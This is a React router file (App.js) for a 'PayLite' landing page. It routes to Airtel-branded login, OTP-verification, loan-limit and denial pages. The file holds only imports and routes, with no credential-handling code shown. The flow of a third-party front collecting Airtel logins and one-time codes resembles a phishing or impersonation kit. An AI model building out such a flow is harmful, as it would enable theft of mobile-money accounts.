import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { LanguageProvider } from './LanguageContext'; 
import PayLiteLanding from './PayLiteLanding'; // <-- Import Landing Page
import AirtelLogin from './AirtelLogin';
import AirtelOTPVerify from './AirtelOTPVerify';
import AirtelLoanLimit from './AirtelLoanLimit';
import AirtelDenied from './AirtelDenied';

function App() {
  return (
    <LanguageProvider>
      <Router>
        <Routes>
          {/* 1. Landing page is the new entry point */}
          <Route path="/" element={<PayLiteLanding />} />
          
          {/* 2. Login Page */}
          <Route path="/login" element={<AirtelLogin />} />
          
          {/* 3. Airtel App Routes */}
          <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
          <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
          <Route path="/airtel-denied" element={<AirtelDenied />} />
        </Routes>
      </Router>
    </LanguageProvider>
  );
}

export default App;